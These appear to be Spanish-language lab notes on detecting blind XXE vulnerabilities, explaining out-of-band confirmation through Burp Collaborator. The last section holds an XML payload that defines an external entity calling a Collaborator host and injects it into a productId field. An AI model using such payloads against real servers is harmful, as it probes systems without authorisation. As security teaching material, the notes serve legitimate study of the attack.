En esta clase continuamos trabajando con vulnerabilidades de tipo XXE, centrándonos en el escenario más complejo: una XXE ciega. En este caso, el servidor procesa XML pero no devuelve en la respuesta ningún dato que evidencie la ejecución del payload, lo que impide confirmar la explotación de forma directa.

Para detectar si la vulnerabilidad existe, utilizamos una entidad externa que hace que el parser XML intente resolver un dominio controlado por nosotros. Aprovechamos Burp Collaborator, que nos permite observar si se han producido solicitudes DNS o HTTP hacia un subdominio generado por su plataforma. Si vemos actividad en Collaborator, confirmamos que el servidor está procesando nuestra entidad y realizando conexiones externas, lo cual demuestra la existencia de la XXE. Esta técnica es fundamental en situaciones donde no hay retroalimentación visible desde la aplicación.

-----

Hacemos lo mismo del ejercicio anterior, para saber si hay un XXE, pero vemos que no refleja nada, lo cual, debemos de hacerlo a ciegas, para ello, debemos de realizar una peticion DNS al collaborator a traves del XXE

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://burpsuite-collaborator/" > ]>
<productId>
&xxe;
</productId>
```

